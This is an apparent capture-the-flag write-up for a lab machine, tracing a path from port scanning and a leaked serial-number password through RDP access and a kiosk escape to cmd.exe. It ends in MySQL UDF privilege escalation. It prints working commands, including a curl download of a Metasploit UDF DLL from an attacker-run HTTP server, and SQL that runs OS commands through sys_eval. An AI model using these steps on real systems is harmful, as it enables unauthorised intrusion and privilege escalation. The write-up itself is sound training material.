<img width="676" height="440" alt="Screenshot 2026-10-08 055011" src="https://github.com/user-attachments/assets/a2955cda-fd1e-4d0a-85fa-ef8b80acd4e6" /># Step 1 — Initial Scan
I started by performing a full TCP port scan against the target to identify exposed services and determine the initial attack surface.

```bash
sudo nmap -p- 10.129.113.18 -sV
```
<img width="785" height="370" alt="Screenshot 2026-10-07 133043" src="https://github.com/user-attachments/assets/cadebbc9-d802-4250-bce0-392f2d39dee6" />


The scan revealed several open TCP ports and the services running on them. This provided the initial direction for further enumeration and allowed me to identify the web service and remote access services exposed by the target.

---

# Step 2 — Web Service Enumeration

One of the discovered services was a web application running on port `8443`. I accessed it through the browser:

```text
http://10.129.113.18:8443/
```

<img width="1306" height="856" alt="Screenshot 2026-10-07 140819" src="https://github.com/user-attachments/assets/ad64d409-ab0c-4949-af9e-b5eeb9d9df50" />

The application presented a login page requiring a password.

To gather more information about the application, I requested the login endpoint directly using `curl`:

```bash
curl http://10.129.113.18:8443/login
```
<img width="841" height="197" alt="Screenshot 2026-10-07 141611" src="https://github.com/user-attachments/assets/5698e618-dc6c-4c10-9608-5e37613a2aaa" />

The response contained an interesting clue indicating that the required password was related to the **device serial number**. This was an important hint that the serial number should be investigated further.

---

# Step 3 — API Enumeration and Authentication

Based on the information obtained from the login page, I proceeded to enumerate the application's API endpoints using `feroxbuster`.

```bash
feroxbuster -u http://10.129.113.18:8443/api \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-x json --depth 2
```
<img width="1396" height="624" alt="Screenshot 2026-10-07 150940" src="https://github.com/user-attachments/assets/7e17fbf7-2176-46a6-95af-6a2640640f64" />

The enumeration revealed the following endpoint:

```text
http://10.129.113.18:8443/api/status
```

Requesting this endpoint exposed the device's **serial number**.
<img width="925" height="256" alt="Screenshot 2026-10-07 151243" src="https://github.com/user-attachments/assets/e3c9dcb0-09f7-4298-a508-a4c8c212a5c2" />

The serial number matched the clue discovered earlier in the login page, confirming that it was the password required to authenticate to the application.
<img width="1886" height="866" alt="Screenshot 2026-10-07 151402" src="https://github.com/user-attachments/assets/0846cbda-1454-4c52-a7f3-3f59c7b08f61" />

Using the serial number as the password, I was able to successfully log in to the dashboard.

---

# Step 4 — Credential Discovery

After successfully authenticating to the dashboard, I inspected the available information and functionality.
<img width="555" height="349" alt="Screenshot 2026-10-07 151856" src="https://github.com/user-attachments/assets/83ae424c-19a6-400e-a8ec-59bac61b9c5f" />

The dashboard exposed valid credentials for a Windows account:

```text
Username: [Redacted]
Password: [Redacted]
```

Since the initial scan had also identified an open RDP service, these credentials appeared to be a potential entry point into the Windows host.

---

# Step 5 — Remote Access via RDP

I attempted to authenticate to the target using the credentials obtained from the web application.

```bash
xfreerdp /v:10.129.113.18 /u:KioskUser /p:'K!0sk2026#' /sec:rdp
```
<img width="1019" height="784" alt="Screenshot 2026-10-07 152630" src="https://github.com/user-attachments/assets/7e2bdbc8-0610-4dcb-8276-1ce32f610b4f" />

The credentials were valid, providing access to the Windows desktop environment as the `KioskUser` account.

---

# Step 6 — Bypassing the Scanner Restriction

After obtaining access to the desktop, I interacted with the application's scanner functionality.

The scanner could be placed into an offline state, which changed the application's behavior and exposed an additional functionality that could be abused for further access.
<img width="820" height="354" alt="Screenshot 2026-10-07 153448" src="https://github.com/user-attachments/assets/737ec1cc-a8cb-4ee1-aba3-7da531d7804e" />

---

# Step 7 — Abusing the Booking Reference Functionality

The application contained a **Booking Ref** section that accepted a reference associated with the HTB Layover environment.
<img width="1113" height="152" alt="Screenshot 2026-10-07 153856" src="https://github.com/user-attachments/assets/aa942c5a-841c-4f8d-b5d8-7ede0ef908a3" />

I entered the obtained credentials/reference into the appropriate field.
<img width="1013" height="801" alt="Screenshot 2026-10-07 153358" src="https://github.com/user-attachments/assets/7b39568f-30ca-4039-b01e-796525530529" />

Instead of processing the request normally, the application returned an error message containing a URL.
<img width="1005" height="798" alt="Screenshot 2026-10-07 153425" src="https://github.com/user-attachments/assets/42339a7f-dd95-4910-8e1a-3a49eda62cbb" />

This error response was particularly interesting because the URL was handled by the Windows system and appeared to reference a local executable.

---

# Step 8 — Command Execution via the Error URL

I inspected the URL returned in the error message and modified the referenced resource to point to the Windows command interpreter:

```text
C:\Windows\System32\cmd.exe
```
<img width="907" height="367" alt="Screenshot 2026-10-07 155507" src="https://github.com/user-attachments/assets/e007afb9-7f30-4945-a2e4-94d055fc4713" />

Opening the modified URL caused the application to launch `cmd.exe`, resulting in command execution on the target system.
<img width="949" height="496" alt="Screenshot 2026-10-07 155633" src="https://github.com/user-attachments/assets/51b9b072-aa82-4836-af09-d6acd33e33cc" />

This provided a command shell running in the context of the `kioskuser` account.

I then verified the current user and retrieved the user flag.

<img width="504" height="100" alt="Screenshot 2026-10-07 160510" src="https://github.com/user-attachments/assets/b63aec8c-1dbb-46a6-bf9e-5e5affe50f5f" />

```text
kioskuser
```

**User Flag obtained successfully.**

---

# Step 9 — Post-Exploitation Enumeration

With an interactive command shell obtained, I began enumerating the system for possible privilege-escalation vectors.

During the enumeration, I discovered credentials for a local MySQL installation.
<img width="871" height="128" alt="Screenshot 2026-10-07 160727" src="https://github.com/user-attachments/assets/07d03443-22e7-4936-a5ab-ddd518454ab4" />

I used the discovered credentials to authenticate to the MySQL server and investigate its configuration and privileges.
<img width="676" height="440" alt="Screenshot 2026-10-08 055011" src="https://github.com/user-attachments/assets/d7516265-e4ad-4752-a960-85d859bdc4d1" />

The MySQL service was running locally, and further enumeration revealed that the current Windows account belonged to:

```text
NT AUTHORITY\Authenticated Users
```

I then inspected the MySQL installation and discovered that the MySQL `plugin` directory was writable by the current user:

```text
C:\MySQL\lib\plugin\
```
<img width="1006" height="803" alt="Screenshot 2026-10-08 060215" src="https://github.com/user-attachments/assets/06b85e77-d11c-4ee6-9e33-fa58cc2e3b53" />

This was significant because MySQL supports **User Defined Functions (UDFs)**, which allow additional functionality to be loaded from shared libraries.

---

# Step 10 — MySQL UDF Privilege Escalation

The privilege-escalation path was based on the following conditions:

- MySQL supports **User Defined Functions (UDFs)**.
- UDFs can be loaded from a DLL specified by the `SONAME` parameter.
- MySQL searches for these libraries in its configured `plugin_dir`.
- The current user had write permissions to the MySQL plugin directory.

Therefore, if I could place a suitable DLL inside:

```text
C:\MySQL\lib\plugin\
```

I could potentially load it as a MySQL UDF and execute operating-system commands through MySQL.

This provided the key privilege-escalation vector.

---

# Step 11 — Preparing the UDF DLL

Metasploit contains a Windows x64 MySQL UDF library that can be used for this purpose.

I copied the DLL to a temporary directory so that it could be transferred to the target:

```bash
mkdir -p /tmp/www

cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll \
/tmp/www/udf64.dll
```
<img width="999" height="427" alt="Screenshot 2026-10-08 093150" src="https://github.com/user-attachments/assets/45144be1-b151-4c0d-8fc5-89eb2f8e4d76" />

I then started a Python HTTP server from the directory containing the DLL:

```bash
cd /tmp/www
python3 -m http.server 8000
```
<img width="640" height="220" alt="Screenshot 2026-10-08 093551" src="https://github.com/user-attachments/assets/e0bbe4c2-8b91-433c-a791-46151781880e" />

This allowed the target machine to retrieve the DLL over HTTP.

---

# Step 12 — Uploading and Loading the UDF

From the Windows target, I downloaded the DLL directly into the writable MySQL plugin directory:

```cmd
curl -s -o C:\MySQL\lib\plugin\udf.dll http://10.10.16.95:8000/udf64.dll
```

I then connected to the local MySQL server using the previously discovered credentials:

```cmd
C:\MySQL\bin\mysql.exe -u root -p"[Password]"
```

Inside MySQL, I registered the DLL as a User Defined Function:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
```

I then tested command execution through the newly created function:

```sql
SELECT sys_eval('whoami');
```
<img width="851" height="426" alt="Screenshot 2026-10-08 094506" src="https://github.com/user-attachments/assets/e3c61d97-0b08-4fcd-b9d6-074b0de10f1b" />

The command executed successfully, confirming that the UDF provided operating-system command execution through MySQL.

This demonstrated that the writable MySQL plugin directory could be leveraged to execute commands with the privileges of the MySQL service.

---

# Step 13 — Retrieving the Root Flag

After confirming command execution through the UDF, I used `sys_eval` to read the root flag from the Administrator's desktop:

```sql
SELECT CAST(
    sys_eval('cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt')
    AS CHAR
);
```
<img width="794" height="173" alt="Screenshot 2026-10-08 101559" src="https://github.com/user-attachments/assets/7d3fa105-4c76-415a-8c46-b6440f81e8d3" />

The command successfully returned the contents of the root flag.

**Root flag obtained successfully.**

---

# Attack Path Summary

The complete attack chain was:

```text
Initial Nmap Scan
        ↓
Web Application on Port 8443
        ↓
Login Page Hint
        ↓
API Enumeration
        ↓
Serial Number Disclosure
        ↓
Web Authentication
        ↓
Credential Discovery
        ↓
RDP Access as KioskUser
        ↓
Scanner / Booking Ref Functionality
        ↓
Error URL Manipulation
        ↓
cmd.exe Execution
        ↓
User Shell
        ↓
MySQL Credential Discovery
        ↓
Writable MySQL Plugin Directory
        ↓
MySQL UDF DLL
        ↓
sys_eval()
        ↓
Command Execution
        ↓
Root Flag
```

The main privilege-escalation issue was the combination of a **writable MySQL plugin directory** and the ability to load a **UDF DLL**, which ultimately enabled operating-system command execution through MySQL.
